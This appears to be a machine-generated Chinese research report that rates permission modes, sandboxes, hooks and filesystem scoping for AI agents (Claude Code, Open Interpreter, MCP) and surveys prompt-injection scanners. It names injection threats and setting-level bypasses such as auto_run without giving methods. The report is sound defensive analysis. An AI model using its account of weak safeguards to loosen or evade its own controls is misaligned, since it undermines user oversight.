`default`/Manual 模式对需要授权的工具第一次使用进行询问；`acceptEdits` 可自动接受文件修改；`plan` 只读/规划而不执行修改；`dontAsk` 对原本需要询问的操作直接拒绝，只运行已预授权或只读能力；`bypassPermissions` 则跳过普通确认，官方明确建议只在隔离 VM/container 等环境中使用。新版本部分 surface 还存在 `auto` 模式，以 classifier 对 shell/network 行为与用户请求的一致性进行判定，因此 **“Claude Code 当前所有用户一定以 Manual 启动”并不成立，具体初始 mode 取决于版本、surface 和设置。** citeturn24search0turn24search4

更值得关注的是 **PreToolUse hooks**：它们可以在 tool execution 前看到完整调用并确定性允许/拒绝，因此比一句写在 CLAUDE.md/SKILL.md 里的“危险操作请先确认”更强。Claude Code 还提供 Bash sandbox，将文件系统和网络能力从 OS 层限制起来；sandbox command 可以自动运行，而无法 sandbox 的命令回退正常 permission flow。citeturn24search0turn24search6turn24search8

强度评估：**OS sandbox + deny rules/PreToolUse hook＝较强；Manual 人工确认＝较强但依赖用户判断；`auto` classifier＝中等；`bypassPermissions`＝低。**

官方来源：  
https://code.claude.com/docs/en/permissions  
https://code.claude.com/docs/en/permission-modes  
https://code.claude.com/docs/en/security  
https://code.claude.com/docs/en/sandboxing  
citeturn24search0turn24search4turn24search6turn24search8

**Claude Computer Use。** 对“Claude Computer Use 在当前个人消费者 UI 中每一种点击/键盘/购买操作的默认 approval 行为”，本次没有得到足够精确的 2026 官方消费者级资料，因此这部分 **未确认**；不把 Claude Code 权限机制错误地当成 Computer Use 的完整替代说明。

**Open Interpreter**

Open Interpreter 的经典安全默认是：模型生成本地代码后，**执行前要求用户确认**；使用 `interpreter -y` 或程序中的 `auto_run=True` 可以绕过确认。项目自身明确警告生成的代码是在用户本地环境中运行，意味着 shell、文件和凭据权限取决于启动它的 OS 用户。citeturn23search12

其仓库曾提供/讨论实验性的 Safe Mode，使用 Semgrep 等扫描生成代码并关闭自动执行，但相关资料明确带有实验性质，因此不能把它当成已验证的 sandbox。当前最明确、长期存在的用户安全边界仍是“执行前确认 + 在真正受限环境中运行”，而不是 LLM 自己判断代码是否安全。Open Interpreter: https://github.com/OpenInterpreter/open-interpreter citeturn23search0turn23search12

强度评估：**默认人工确认＝中等；真正 VM/container＝较强；Safe Mode 静态扫描＝辅助；`-y`/auto_run＝低。**

**MCP 工具**

MCP 协议本身**没有给所有客户端强制规定一个统一的“每次破坏操作必须弹窗”策略**；这属于 client/host 和具体 server 的权限模型。因此“用了 MCP”本身不等于“拥有 tool approval”。

但官方 filesystem MCP server 给出了一个非常具体的个人用户防御原语：启动时只传入允许目录，或使用 MCP Roots；所有文件系统 operation 都会被限制在 allowed directories 内。Docker 部署还能把某个目录用 `ro` mount 成只读。server 的 tool annotations 还标注 `readOnlyHint`、`destructiveHint` 等信息供支持它们的客户端展示或决策。fileciteturn6file0L1-L2

例如官方文档的设计是：

```text
mcp-server-filesystem /path/to/allowed/project
```

而不是把 `/`、整个 home 目录或包含 SSH/API credential 的父目录交给 Agent。Docker `ro` bind mount 则是在文件系统层阻止写入，而不是依赖模型“记得不要修改”。官方实现：  
https://github.com/modelcontextprotocol/servers/tree/main/src/filesystem  
https://github.com/modelcontextprotocol/servers/blob/main/src/filesystem/README.md  
fileciteturn5file0L1-L7 fileciteturn6file0L1-L2

强度评估：**Roots/allowed directories＝较强 scope boundary；Docker `ro`＝强确定性写保护；tool annotations＝提示信息，只有 host 真正执行相应策略时才构成保护。**

## 可落地的开源防御与 SKILL.md / Agent 插件现状

这里需要特别区分两类完全不同的东西：

**“安全提示词/安全 Skill”告诉 Agent 应该怎么做；“sandbox/hook/filesystem scope”决定 Agent 实际能做什么。** 前者被 prompt injection 覆盖或误判的可能性天然更高，不能与后者视为等价控制。

| 项目 | 解决的问题 | 是否硬拦截 | 适合个人用户的价值 | 来源 |
|---|---|---:|---|---|
| **@modelcontextprotocol/server-filesystem** | 把 MCP 文件访问锁定在明确目录；可 Docker read-only mount。 | **是，服务器/OS 层** | 当前最直接、最可靠的“Agent 只能碰这些目录”开源方案之一。 | https://github.com/modelcontextprotocol/servers/tree/main/src/filesystem fileciteturn5file0L1-L7 |
| **Claude Code PreToolUse hooks** | 在执行命令/工具前由用户自定义脚本检查并拒绝调用。 | **可以是** | 可实现破坏性命令 deny、路径约束、网络规则；不是第三方 SKILL.md，而是 host 原生执行闸门。 | https://code.claude.com/docs/en/permissions citeturn24search0 |
| **Claude Code sandbox** | OS 层文件/网络隔离。 | **是** | 比基于 LLM 的“这条命令看起来安全吗”更强。 | https://code.claude.com/docs/en/sandboxing citeturn24search8 |
| **Cursor sandbox / permissions.json / sandbox.json** | 文件、网络、command approval / Auto-review。 | 部分是 | `sandbox.json` 属于能力限制；Auto-review 只是 best-effort classifier，不能混为一谈。 | https://cursor.com/docs/agent/security/run-modes；https://cursor.com/docs/reference/sandbox citeturn22search0turn22search11 |
| **Open Interpreter 默认 execute confirmation** | 每次生成代码执行前询问。 | 需要用户确认 | 默认存在；`-y`/`auto_run` 会主动取消这一层。 | https://github.com/OpenInterpreter/open-interpreter citeturn23search12 |
| **mcp-scan** | 扫描 MCP server/tool poisoning、可疑描述与配置。 | 以检测为主 | 安装陌生 MCP server 前比“直接试一下”有价值；但原仓库已有迁移，当前维护状态需单独确认。 | https://github.com/invariantlabs-ai/mcp-scan；https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks citeturn17view2 |
| **LLM Guard** | 对文本做 Prompt Injection / Invisible Text / URL / Secret 等 scanner。 | 取决于用户接入方式 | 可做本地“读取文档前先过 scanner”的基础组件。 | https://github.com/protectai/llm-guard；**2026-07 已 archived**。citeturn23search5turn23search8 |
| **skill-scanner** | 安装 SKILL.md 前扫描 skill 与脚本中的 prompt injection 等模式。 | 否，主要审计 | 对下载陌生 Agent Skill 有针对性，但属于社区实验工具。 | https://github.com/syedabbast/skill-scanner/blob/780fb11ee7499e58e3867f8c7850644c65ee9805/SKILL.md fileciteturn2file7L137-L148 |
| **openclaw-admin-skill** | SKILL.md 中规定对若干敏感操作必须获得明确用户确认，并禁止外传 secrets/config。 | **否，prompt-level** | 是用户要求的“执行前人类确认 Skill”的实际公开例子，但只有 Agent 遵守时才有效。 | https://github.com/rendrag-git/openclaw-admin-skill/blob/a96ef56db580d088553c9fb044160b00c27c0c71/SKILL.md fileciteturn3file0L1-L12 |
| **Galyarder security skill** | 要求在工具执行前做风险评估等 Agent 安全流程。 | 否，prompt-level | 可作安全流程模板；不应视为 shell sandbox。 | https://github.com/galyarderlabs/galyarder-framework/blob/5fef282e926c9a01a6ee755cfb26e2e4301df40a/skills/security/SKILL.md fileciteturn3file2L41-L52 |

针对用户问题中的三个特定目标，可以给出更直接的结论：

**“执行前必须人类确认”的 SKILL.md：有。** `openclaw-admin-skill` 是一个明确公开例子，其中包含对敏感动作要求 explicit user confirmation 的规则。fileciteturn3file0L1-L12

**“破坏性命令硬拦截”的纯 SKILL.md：没有找到可视为可靠安全边界的成熟实现。** SKILL.md 本身就是 Agent 可读取的指令文本；即使写了“禁止 rm”，执行 host 若仍给予 unrestricted shell，最终 enforcement 仍取决于模型。真正适合做 hard block 的是 Claude Code `PreToolUse`/deny rule、Cursor permissions/sandbox 或 OS/container policy。citeturn24search0turn24search8turn22search0

**“文件系统访问范围限制”的成熟开源实现：有，而且不需要依赖 Skill。** MCP 官方 `server-filesystem` 通过 allowed directories/Roots 限制所有文件工具，并支持 Docker read-only mount，是比“请 Agent 不要看 `~/.ssh`”强得多的机制。fileciteturn6file0L1-L2

同样，对于“外部文档 prompt-injection 净化”，当前生态最明显的空缺是：**检测器有，真正成熟的通用消费者文档安全网关没有。** LLM Guard 可以扫描文本，但已归档；mcp-scan 解决 MCP 而非 PDF；skill-scanner 解决 Agent skills；没有找到一个活跃成熟、主流采用、可直接作为浏览器扩展拦截 ChatGPT/Claude/Gemini 上传内容的开源工具。

## 结论、证据边界与仍未确认的问题

从 2024–2026 年的发展看，个人 AI 安全最大的变化不是“模型更容易说错话”，而是三个原本独立的问题开始叠加：**长期状态、外部不可信内容、执行权限。** ChatGPT/Claude/Gemini 等加入 Memory、Projects、Notebook 等长期状态后，恶意内容可以反复重新进入上下文；Cursor、Claude Code、Open Interpreter 和 MCP 又把模型输出连接到 shell、filesystem、browser、network 与第三方服务，所以 prompt injection 的后果开始从“错误回答”扩展成“真实副作用”。这些机制本身都有官方或公开研究证据。citeturn5search0turn19search0turn17view2turn22search3turn24search6

但本次研究同样发现了几个需要**明确保留为未知**的区域：

第一，**不能可靠声称某一家主流平台在 2026-10-01 对 Markdown Image Exfiltration“完全修复”或“仍然全面脆弱”**。公开旧 PoC 可以证明攻击类别存在，却不能代替今天每个 Web/Desktop/Mobile renderer 的实时安全测试；官方也普遍没有发布完整跨客户端状态矩阵。

第二，**Cursor、Microsoft Copilot、Grok 等部分产品的“新账号全局默认训练开关”并没有稳定、统一的官方表述**。这里不能因为某个地区某个测试账号 UI 默认打开，就将其写成全球产品事实，因此分别标记了“未确认”。

第三，**Microsoft Copilot feedback 是否像 ChatGPT/Gemini 一样明确覆盖训练 opt-out、以及普通消费者会话的精确人工审查条件，本次未找到足够明确的官方消费者说明。**

第四，**普通 Claude 附件、Cursor 通用文件附件、Grok 文件是否都有用户可见的独立逐文件删除对象，本次没有足够官方资料确认。** 已确认的例外是 ChatGPT Library、Claude Project Knowledge、Gemini/Notebook 来源等明显独立于单条普通聊天的长期对象。citeturn4search0turn24search1

第五，**在个人用户范围内，真实 prompt-injection 受害者事故公开证据明显少于 PoC 数量。** Invariant MCP Tool Poisoning、Cursor trusted-command 攻击、ChatGPT Memory injection 等都应标成安全研究/PoC；CVE-2025-6514 则属于真实正式漏洞，但公开漏洞 ≠ 已确认有个人用户被利用。citeturn17view2turn17view3

因此，在目前能被公开资料直接支持的防御工具中，最有实际安全意义的并不是再写一层“安全 prompt”，而是已经存在的**确定性能力约束**：MCP filesystem 的 allowed directories/Roots 与只读 mount、Claude Code sandbox 与 PreToolUse/deny、Cursor sandbox 与 permissions、Open Interpreter 保留执行前确认。相比之下，Auto-review classifier、prompt-injection scanner 和 SKILL.md 安全指令属于有用的附加层，但公开文档和安全研究都不足以把它们视为单独可靠的安全边界。citeturn22search0turn24search0turn24search8turn23search12 fileciteturn6file0L1-L2